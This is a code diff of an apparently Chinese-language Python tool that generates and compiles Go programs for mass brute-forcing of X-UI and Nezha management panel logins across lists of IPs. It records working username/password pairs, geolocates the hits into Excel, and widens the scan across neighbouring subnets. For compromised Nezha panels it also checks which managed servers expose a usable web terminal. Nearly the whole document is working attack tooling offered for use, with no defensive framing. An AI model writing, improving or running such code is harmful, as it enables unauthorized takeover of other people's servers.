@@ -25,7 +25,7 @@ try:
     init(autoreset=True)
 except ImportError as e:
     print("❌ 错误：核心 Python 模块缺失！")
-    print("缺失的模块是: {}".format(e.name))
+    print(f"缺失的模块是: {e.name}")
     print("请先手动安装所有依赖：")
     print("python3 -m pip install psutil requests pyyaml openpyxl tqdm colorama")
     sys.exit(1)
@@ -60,8 +60,10 @@ XUI_GO_TEMPLATE_1_LINES = [
     "	\"sync\"",
     "	\"time\"",
     ")",
+    "// worker 函数从任务通道接收IP，并交由 processIP 处理",
     "func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {",
     "	defer wg.Done()",
+    "	// 创建可复用的 HTTP客户端, 跳过TLS验证并禁用长连接以提高性能",
     "	tr := &http.Transport{",
     "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
     "		DisableKeepAlives: true,",
@@ -71,8 +73,10 @@ XUI_GO_TEMPLATE_1_LINES = [
     "		processIP(line, file, usernames, passwords, httpClient)",
     "	}",
     "}",
+    "// processIP 针对单个IP，尝试所有用户名和密码组合进行登录",
     "func processIP(line string, file *os.File, usernames []string, passwords []string, httpClient *http.Client) {",
     "	var ipPort string",
+    "	// 尝试从完整的URL中解析出 'ip:port'",
     "	u, err := url.Parse(strings.TrimSpace(line))",
     "	if err == nil && u.Host != \"\" {",
     "		ipPort = u.Host",
@@ -80,19 +84,22 @@ XUI_GO_TEMPLATE_1_LINES = [
     "		ipPort = strings.TrimSpace(line)",
     "	}",
     "	parts := strings.Split(ipPort, \":\")",
-    "	if len(parts) != 2 { return }",
+    "	if len(parts) != 2 { return } // 如果格式不正确则跳过",
     "	ip, port := parts[0], parts[1]",
+    "	// 遍历所有用户名和密码",
     "	for _, username := range usernames {",
     "		for _, password := range passwords {",
     "			var resp *http.Response",
     "			var err error",
     "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
+    "			// 1. 尝试 HTTP 登录",
     "			checkURLHttp := fmt.Sprintf(\"http://%s:%s/login\", ip, port)",
     "			payloadHttp := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
     "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payloadHttp))",
     "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
     "			resp, err = httpClient.Do(reqHttp)",
     "			cancel()",
+    "			// 2. 如果 HTTP 失败, 尝试 HTTPS 登录",
     "			if err != nil {",
     "				if resp != nil { resp.Body.Close() }",
     "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
@@ -105,14 +112,17 @@ XUI_GO_TEMPLATE_1_LINES = [
     "			}",
     "			if err != nil {",
     "				if resp != nil { resp.Body.Close() }",
-    "				continue",
+    "				continue // 如果两种协议都失败，则尝试下一个密码",
     "			}",
+    "			// 检查响应状态码是否为200 OK",
     "			if resp.StatusCode == http.StatusOK {",
     "				body, readErr := io.ReadAll(resp.Body)",
     "				if readErr == nil {",
     "					var responseData map[string]interface{}",
+    "					// 解析JSON响应并检查 'success' 字段",
     "					if json.Unmarshal(body, &responseData) == nil {",
     "						if success, ok := responseData[\"success\"].(bool); ok && success {",
+    "							// 登录成功, 写入结果并立即返回",
     "							file.WriteString(fmt.Sprintf(\"%s:%s %s %s\\n\", ip, port, username, password))",
     "							resp.Body.Close()",
     "							return",
@@ -120,11 +130,13 @@ XUI_GO_TEMPLATE_1_LINES = [
     "					}",
     "				}",
     "			}",
+    "			// 丢弃响应体以重用连接",
     "			io.Copy(io.Discard, resp.Body)",
     "			resp.Body.Close()",
     "		}",
     "	}",
     "}",
+    "// main 函数是程序的入口，负责读取文件和初始化并发任务",
     "func main() {",
     "	if len(os.Args) < 3 {",
     "		fmt.Println(\"Usage: ./program <inputFile> <outputFile>\")",
@@ -143,24 +155,28 @@ XUI_GO_TEMPLATE_1_LINES = [
     "		return",
     "	}",
     "	defer outFile.Close()",
+    "	// 用户名和密码列表由Python脚本填充",
     "	usernames, passwords := {user_list}, {pass_list}",
     "	if len(usernames) == 0 || len(passwords) == 0 {",
     "		fmt.Println(\"错误：用户名或密码列表为空。\")",
     "		return",
     "	}",
+    "	// 创建带缓冲的任务通道",
     "	tasks := make(chan string, {semaphore_size})",
     "	var wg sync.WaitGroup",
+    "	// 启动指定数量的 worker goroutine",
     "	for i := 0; i < {semaphore_size}; i++ {",
     "		wg.Add(1)",
     "		go worker(tasks, outFile, &wg, usernames, passwords)",
     "	}",
+    "	// 逐行读取输入文件并将任务发送到通道",
     "	scanner := bufio.NewScanner(batch)",
     "	for scanner.Scan() {",
     "		line := strings.TrimSpace(scanner.Text())",
     "		if line != \"\" { tasks <- line }",
     "	}",
-    "	close(tasks)",
-    "	wg.Wait()",
+    "	close(tasks) // 关闭通道，通知 worker 任务已结束",
+    "	wg.Wait() // 等待所有 worker 完成",
     "}",
 ]
 
@@ -1007,6 +1023,7 @@ TCP_PRESCAN_GO_TEMPLATE_LINES = [
     "}",
 ]
 
+
 # 子网TCP扫描模板
 SUBNET_TCP_SCANNER_GO_TEMPLATE_LINES = [
     "package main",
@@ -1110,6 +1127,7 @@ def get_ip_info_batch(ip_list, retries=3):
     url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
     results = {}
     payload = [{"query": ip_port.split(':')[0]} for ip_port in ip_list]
+
     for attempt in range(retries):
         try:
             response = requests.post(url, json=payload, timeout=20)
@@ -1137,23 +1155,28 @@ def get_ip_info_batch(ip_list, retries=3):
                 time.sleep(2)
             else:
                 return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
+    
     return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]
 
 def process_ip_port_file(input_file, output_excel):
     with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
         lines = [line.strip() for line in f if line.strip()]
+    
     headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']
+
     if os.path.exists(output_excel):
         try:
             os.remove(output_excel)
         except OSError as e:
             print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。")
             return
+
     wb = Workbook()
     ws = wb.active
     ws.title = "IP信息"
     ws.append(headers)
     wb.save(output_excel)
+
     targets = []
     for line in lines:
         addr, user, passwd = line, '', ''
@@ -1173,29 +1196,38 @@ def process_ip_port_file(input_file, output_excel):
                     addr = parts[0]
         except Exception:
              addr = line.split()[0] if line.split() else ''
+        
         ip_port = extract_ip_port(addr)
         if ip_port:
             targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})
+
     chunk_size = 100
     with tqdm(total=len(targets), desc="[📊] IP信息查询", unit="ip", ncols=100) as pbar:
         for i in range(0, len(targets), chunk_size):
             chunk = targets[i:i+chunk_size]
             ip_ports_in_chunk = [target['ip_port'] for target in chunk]
+            
             batch_results = get_ip_info_batch(ip_ports_in_chunk)
+            
             wb = load_workbook(output_excel)
             ws = wb.active
+            
             for original_target, result_data in zip(chunk, batch_results):
                 row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
                 ws.append(row)
+            
             wb.save(output_excel)
             pbar.update(len(chunk))
+            
             if i + chunk_size < len(targets):
                 time.sleep(4.5)
+
     wb = load_workbook(output_excel)
     ws = wb.active
     adjust_column_width(ws)
     wb.save(output_excel)
     print("\nIP信息查询完成！")
+
 
 if __name__ == "__main__":
     if len(sys.argv) > 2:
@@ -1209,41 +1241,6 @@ def generate_ipcx_py():
         f.write(IPCX_PY_CONTENT)
 
 # 哪吒面板分析函数
-def check_server_terminal_status(session, base_url, server_id):
-    try:
-        terminal_paths = [f"/dashboard/terminal/{server_id}", f"/dashboard/ssh/{server_id}", f"/terminal/{server_id}"]
-        for path in terminal_paths:
-            try:
-                res = session.get(base_url + path, timeout=5, verify=False)
-                if res.status_code == 200:
-                    content = res.text.lower()
-                    if "xterm" in content and "not found" not in content and "error" not in content:
-                        return True
-            except Exception:
-                continue
-    except Exception:
-        return False
-    return False
-
-def count_terminal_accessible_servers(session, base_url):
-    try:
-        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
-        if res.status_code != 200: return 0, []
-        data = res.json()
-        servers = data if isinstance(data, list) else data.get("data", [])
-        if not servers: return 0, []
-        count = 0
-        accessible_servers = []
-        for server in servers:
-            if isinstance(server, dict) and "id" in server:
-                server_id = server["id"]
-                if check_server_terminal_status(session, base_url, server_id):
-                    count += 1
-                    accessible_servers.append({"id": server_id, "name": server.get("name", f"Server-{server_id}"), "status": "终端畅通"})
-        return count, accessible_servers
-    except Exception:
-        return 0, []
-
 def analyze_panel(result_line):
     parts = result_line.split()
     if len(parts) < 3: return result_line, (0, 0, "格式错误")
@@ -1263,16 +1260,24 @@ def analyze_panel(result_line):
                     if is_login_success:
                         if "token" in j.get("data", {}):
                             session.headers.update({"Authorization": f"Bearer {j['data']['token']}"})
-                        term_count, machine_count = 0, 0
+                        
+                        machine_count, term_count, term_servers = 0, 0, []
                         try:
                             server_res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
                             if server_res.status_code == 200:
                                 server_data = server_res.json()
                                 servers = server_data if isinstance(server_data, list) else server_data.get("data", [])
                                 machine_count = len(servers)
+                                # 在获取到服务器列表后，再检查终端状态
+                                for server in servers:
+                                    if isinstance(server, dict) and "id" in server:
+                                        if check_server_terminal_status(session, base_url, server["id"]):
+                                            term_count += 1
+                                            term_servers.append(server)
+
                         except Exception:
                             pass
-                        term_count, term_servers = count_terminal_accessible_servers(session, base_url)
+                        
                         servers_string = ", ".join([s.get('name', str(s.get('id', ''))) for s in term_servers]) or "无"
                         return result_line, (machine_count, term_count, servers_string)
                 except Exception:
@@ -1281,17 +1286,28 @@ def analyze_panel(result_line):
             continue
     return result_line, (0, 0, "登录失败")
 
-# 主脚本逻辑
-GO_EXEC = "go"
+def check_server_terminal_status(session, base_url, server_id):
+    # 此函数较为简化，仅作为示例
+    try:
+        res = session.get(f"{base_url}/dashboard/terminal/{server_id}", timeout=5, verify=False)
+        return res.status_code == 200 and "xterm" in res.text.lower()
+    except Exception:
+        return False
+
+
+# =========================== 主脚本逻辑 ===========================
+# 优先使用 /usr/local/go/bin/go, 其次使用系统路径中的 go
+GO_EXEC = "/usr/local/go/bin/go" if os.path.exists("/usr/local/go/bin/go") else "go"
 
 def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
     if not os.path.exists(xlsx_file): return
     try:
         wb = load_workbook(xlsx_file)
         ws = wb.active
-        headers = ["服务器总数", "终端畅通数", "畅通服务器列表"]
-        for i, header in enumerate(headers, 1):
-            ws.cell(row=1, column=ws.max_column + i, value=header)
+        # 添加新的表头
+        ws.cell(row=1, column=ws.max_column + 1, value="服务器总数")
+        ws.cell(row=1, column=ws.max_column + 1, value="终端畅通数")
+        ws.cell(row=1, column=ws.max_column + 1, value="畅通服务器列表")
         for row_idx in range(2, ws.max_row + 1):
             original_address = ws.cell(row=row_idx, column=1).value
             if original_address in analysis_data:
@@ -1333,17 +1349,104 @@ def compile_go_program(go_file, executable_name):
     if sys.platform == "win32": executable_name += ".exe"
     print(f"📦 [编译] 正在编译Go程序 {go_file} -> {executable_name}...")
     try:
-        # 简化编译命令，依赖本地Go环境
-        subprocess.run([GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, go_file], check=True, capture_output=True)
+        process = subprocess.run([GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, go_file], check=True, capture_output=True)
         print(f"✅ [编译] Go程序编译成功: {executable_name}")
         return executable_name
     except (subprocess.CalledProcessError, FileNotFoundError) as e:
         print(f"❌ [编译] Go程序 {go_file} 编译失败!")
         if isinstance(e, FileNotFoundError):
-            print("   - 错误: 未找到 'go' 命令。请确保Go语言环境已正确安装并配置在系统PATH中。")
+            print(f"   - 错误: 未找到Go命令 '{GO_EXEC}'。请确保Go语言环境已正确安装并配置在系统PATH中。")
         else:
             print(f"   - 错误输出:\n{e.stderr.decode('utf-8', 'ignore')}")
-        return None
+        sys.exit(1)
+
+def adjust_oom_score():
+    if sys.platform != "linux": return
+    try:
+        pid = os.getpid()
+        with open(f"/proc/{pid}/oom_score_adj", "w") as f:
+            f.write("-500")
+        print("✅ [系统] 成功调整OOM Score，降低被系统杀死的概率。")
+    except PermissionError:
+        print("⚠️  [系统] 调整OOM Score失败：权限不足。")
+    except Exception as e:
+        print(f"⚠️  [系统] 调整OOM Score时发生未知错误: {e}")
+
+def check_and_manage_swap():
+    if sys.platform != "linux": return
+    try:
+        if psutil.swap_memory().total > 0:
+            print(f"✅ [系统] 检测到已存在的Swap空间，大小: {psutil.swap_memory().total / 1024 / 1024:.2f} MiB。")
+            return
+        total_mem_gb = psutil.virtual_memory().total / (1024**3)
+        rec_swap = 2 if total_mem_gb < 2 else (int(total_mem_gb / 2) if total_mem_gb <= 8 else (4 if total_mem_gb <= 32 else 8))
+        if input(f"❓ 未检测到Swap。是否创建 {rec_swap}GB 临时Swap文件以提高稳定性？(y/N): ").lower() == 'y':
+            swap_file = "/tmp/autoswap.img"
+            print(f"   - 正在创建 {rec_swap}GB Swap文件: {swap_file}...")
+            try:
+                subprocess.run(["fallocate", "-l", f"{rec_swap}G", swap_file], check=True, stderr=subprocess.DEVNULL)
+                subprocess.run(["chmod", "600", swap_file], check=True)
+                subprocess.run(["mkswap", swap_file], check=True)
+                subprocess.run(["swapon", swap_file], check=True)
+                atexit.register(cleanup_swap, swap_file)
+                print(f"✅ [系统] 成功创建并启用 {rec_swap}GB Swap文件。")
+            except Exception as e:
+                print(f"❌ [系统] Swap文件创建失败: {e}")
+    except Exception as e:
+        print(f"❌ [系统] Swap检查失败: {e}")
+
+def cleanup_swap(swap_file):
+    print(f"\n   - 正在清理临时Swap文件: {swap_file} ...")
+    try:
+        subprocess.run(["swapoff", swap_file], check=False)
+        os.remove(swap_file)
+        print("✅ [系统] 临时Swap文件已清理。")
+    except Exception as e:
+        print(f"⚠️  [系统] 清理Swap文件失败: {e}")
+
+
+def is_in_china():
+    print("    - 正在通过 ping google.com 检测网络环境...")
+    try:
+        if subprocess.run(["ping", "-c", "1", "-W", "2", "google.com"], capture_output=True).returncode == 0:
+            print("    - 🌍 Ping 成功，判断为海外服务器。")
+            return False
+        else:
+            print("    - 🇨🇳 Ping 超时或失败，判断为国内服务器，将自动使用镜像。")
+            return True
+    except (FileNotFoundError, Exception):
+        print("    - ⚠️  Ping 检测失败，将使用默认源。")
+        return False
+
+def check_environment(template_mode, is_china_env):
+    print(">>> 正在检查依赖环境...")
+    # 仅检查和安装Go模块
+    go_env = os.environ.copy()
+    go_env['GOPROXY'] = 'https://goproxy.cn,direct' if is_china_env else 'https://proxy.golang.org,direct'
+    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
+    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
+    
+    try:
+        if not os.path.exists("go.mod"):
+            subprocess.run([GO_EXEC, "mod", "init", "xui"], check=True, capture_output=True, env=go_env)
+        
+        required_pkgs = []
+        if template_mode == 6: required_pkgs.append("golang.org/x/crypto/ssh")
+        if template_mode in [9, 10, 11]: required_pkgs.append("golang.org/x/net/proxy")
+        
+        if required_pkgs:
+            print("    - 正在安装Go模块...")
+            for pkg in required_pkgs:
+                subprocess.run([GO_EXEC, "get", pkg], check=True, capture_output=True, env=go_env)
+            print("    - ✅ Go模块安装完成。")
+    except (FileNotFoundError, subprocess.CalledProcessError) as e:
+        print("\n❌ Go环境配置失败。请确保Go语言已正确安装并位于系统PATH中。")
+        if isinstance(e, subprocess.CalledProcessError):
+            print(f"   - 错误详情: {e.stderr.decode('utf-8', 'ignore')}")
+        sys.exit(1)
+    
+    print(">>> ✅ 环境依赖检测完成 ✅ <<<\n")
+
 
 def process_chunk(chunk_id, lines, executable_name):
     input_file = os.path.join(TEMP_PART_DIR, f"input_{chunk_id}.txt")
@@ -1381,7 +1484,7 @@ def run_scan_in_parallel(lines, executable_name, python_concurrency, chunk_size,
                 pbar.update(1)
     print("\n")
 
-def merge_result_files(prefix: str, output_name: str, target_dir: str):
+def merge_result_files(prefix, output_name, target_dir):
     files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
     if not files_to_merge: return
     with open(output_name, "w", encoding="utf-8") as out:
@@ -1407,8 +1510,7 @@ def clean_temp_files():
     ]
     for f in files_to_remove:
         if os.path.exists(f):
-            try:
-                os.remove(f)
+            try: os.remove(f)
             except OSError: pass
     print("✅ [清理] 清理完成。")
 
@@ -1421,7 +1523,7 @@ def choose_template_mode():
         print("❌ 输入无效，请重新输入。")
 
 def load_credentials(template_mode):
-    if template_mode in [7, 12, 13]: return [], [], []
+    if template_mode in [7, 12, 13]: return [], [], [] # No creds needed
     use_custom = input("是否使用 username.txt / password.txt 字典库？(y/N，使用内置默认值): ").strip().lower()
     if use_custom == 'y':
         if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
@@ -1436,48 +1538,43 @@ def load_credentials(template_mode):
         if not usernames or not passwords: print("❌ 错误: 用户名或密码文件为空。"); sys.exit(1)
         return usernames, passwords, []
     else:
-        return ["admin"], ["admin"], []
+        return ["root"] if template_mode == 8 else ["admin"], ["password"] if template_mode == 8 else ["admin"], []
 
 def scan_single_cluster(cluster_info):
-    cluster_id, subnet_prefix, port, user, password, subnet_size, subnet_scanner_executable, main_brute_executable = cluster_info
-    newly_verified_this_cluster = set()
+    cluster_id, subnet_prefix, port, user, password, subnet_size, subnet_scanner_executable, _ = cluster_info
+    newly_verified = set()
     cidr = f"{subnet_prefix}.0.0/{subnet_size}" if subnet_size == 16 else f"{subnet_prefix}.0/{subnet_size}"
-    subnet_scan_output = os.path.join(TEMP_EXPAND_DIR, f"subnet_scan_{cluster_id}.tmp")
+    scan_output = os.path.join(TEMP_EXPAND_DIR, f"scan_{cluster_id}.tmp")
     try:
-        go_concurrency_subnet = int(params.get('semaphore_size', 100)) * 2
-        cmd = ['./' + subnet_scanner_executable, cidr, port, subnet_scan_output, str(go_concurrency_subnet)]
+        cmd = ['./' + subnet_scanner_executable, cidr, port, scan_output, str(params.get('semaphore_size', 100) * 2)]
         subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-    except Exception:
-        return newly_verified_this_cluster
-    if not os.path.exists(subnet_scan_output) or os.path.getsize(subnet_scan_output) == 0:
-        if os.path.exists(subnet_scan_output): os.remove(subnet_scan_output)
-        return newly_verified_this_cluster
-    with open(subnet_scan_output, 'r') as f:
-        with master_results_lock:
+        if not os.path.exists(scan_output) or os.path.getsize(scan_output) == 0: return newly_verified
+        with open(scan_output, 'r') as f, master_results_lock:
             ips_to_verify = {line.strip() for line in f} - {l.split()[0] for l in master_results}
-    if not ips_to_verify:
-        if os.path.exists(subnet_scan_output): os.remove(subnet_scan_output)
-        return newly_verified_this_cluster
-    verification_input_file = os.path.join(TEMP_EXPAND_DIR, f"verify_input_{cluster_id}.tmp")
-    verification_output_file = os.path.join(TEMP_EXPAND_DIR, f"verify_output_{cluster_id}.tmp")
-    with open(verification_input_file, 'w') as f: f.write("\n".join(ips_to_verify))
-    try:
-        temp_go_code = f"xui_expand_{cluster_id}.go"
-        temp_executable = f"xui_expand_exec_{cluster_id}"
-        expand_params = params.copy()
-        expand_params['usernames'], expand_params['passwords'] = [user], [password]
-        generate_go_code(temp_go_code, template_map[TEMPLATE_MODE], **expand_params)
-        executable = compile_go_program(temp_go_code, temp_executable)
+        if not ips_to_verify: return newly_verified
+        
+        verify_input = os.path.join(TEMP_EXPAND_DIR, f"verify_in_{cluster_id}.tmp")
+        verify_output = os.path.join(TEMP_EXPAND_DIR, f"verify_out_{cluster_id}.tmp")
+        with open(verify_input, 'w') as f: f.write("\n".join(ips_to_verify))
+
+        # Compile a temporary, specific executable for this cluster
+        temp_go = f"expand_{cluster_id}.go"
+        temp_exec = f"expand_exec_{cluster_id}"
+        temp_params = {**params, 'usernames': [user], 'passwords': [password]}
+        generate_go_code(temp_go, template_map[TEMPLATE_MODE], **temp_params)
+        executable = compile_go_program(temp_go, temp_exec)
+        
         if executable:
-            cmd = ['./' + executable, verification_input_file, verification_output_file]
-            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
-            if os.path.exists(verification_output_file):
-                with open(verification_output_file, 'r') as f:
-                    newly_verified_this_cluster.update(line.strip() for line in f)
+            subprocess.run(['./' + executable, verify_input, verify_output], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
+            if os.path.exists(verify_output):
+                with open(verify_output, 'r') as f:
+                    newly_verified.update(line.strip() for line in f)
+    except Exception:
+        pass
     finally:
-        for f in [subnet_scan_output, verification_input_file, verification_output_file, temp_go_code, temp_executable, temp_executable + '.exe']:
+        for f in [scan_output, verify_input, verify_output, temp_go, temp_exec, temp_exec + ".exe"]:
             if os.path.exists(f): os.remove(f)
-    return newly_verified_this_cluster
+    return newly_verified
 
 def expand_scan_with_go(result_file, main_brute_executable, subnet_scanner_executable, subnet_size, python_concurrency):
     if not os.path.exists(result_file) or os.path.getsize(result_file) == 0: return set()
@@ -1494,12 +1591,13 @@ def expand_scan_with_go(result_file, main_brute_executable, subnet_scanner_execu
             if not ip or not port: continue
             subnet_prefix = ".".join(ip.split('.')[:2]) if subnet_size == 16 else ".".join(ip.split('.')[:3])
             key = (subnet_prefix, port, user, password)
-            if key not in groups: groups[key] = set()
-            groups[key].add(ip)
+            groups.setdefault(key, set()).add(ip)
+        
         expandable_targets = [key for key, ips in groups.items() if len(ips) >= 2]
         if not expandable_targets:
             print(f"  - 第 {i + 1} 轮未找到符合条件的IP集群，扩展扫描结束。"); break
         print(f"  - 第 {i + 1} 轮发现 {len(expandable_targets)} 个可扩展的IP集群，开始并行扫描...")
+        
         newly_verified_this_round = set()
         tasks = [(idx, *key, subnet_size, subnet_scanner_executable, main_brute_executable) for idx, key in enumerate(expandable_targets)]
         with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
@@ -1518,6 +1616,7 @@ def expand_scan_with_go(result_file, main_brute_executable, subnet_scanner_execu
         if not newly_verified_this_round:
             print(f"--- 第 {i + 1} 轮未发现任何全新的IP，扩展扫描结束。 ---"); break
         ips_to_analyze = newly_verified_this_round
+
     with open(result_file, 'r', encoding='utf-8') as f: initial_set = {line.strip() for line in f}
     return master_results - initial_set
 
@@ -1557,6 +1656,12 @@ if __name__ == "__main__":
     try:
         print("\n🚀 === 爆破一键启动 - 参数配置 === 🚀")
         
+        is_china_env = is_in_china()
+        check_environment(TEMPLATE_MODE, is_china_env)
+        
+        adjust_oom_score()
+        check_and_manage_swap()
+        
         use_go_prescan = input("是否启用 Go TCP 预扫描？(y/N): ").strip().lower() == 'y' if TEMPLATE_MODE != 13 else False
         input_file = input("📝 请输入源文件名 (默认: 1.txt)：").strip() or "1.txt"
         if not os.path.exists(input_file): print(f"❌ 错误: 文件 '{input_file}' 不存在。"); sys.exit(1)
@@ -1564,7 +1669,6 @@ if __name__ == "__main__":
         total_ips = len(all_lines)
         print(f"--- 📝 总计 {total_ips} 个目标 ---")
         
-        # 简化并发配置
         cpu_cores = os.cpu_count() or 2
         python_concurrency = input_with_default("请输入Python并发任务数", cpu_cores * 2)
         go_internal_concurrency = input_with_default("请输入每个任务内部的Go并发数", 100)
@@ -1589,7 +1693,6 @@ if __name__ == "__main__":
         }
         generate_go_code("xui.go", template_map[TEMPLATE_MODE], **params)
         executable = compile_go_program("xui.go", "xui_executable")
-        if not executable: sys.exit(1)
         
         generate_ipcx_py()
         run_scan_in_parallel(all_lines, executable, python_concurrency, chunk_size)
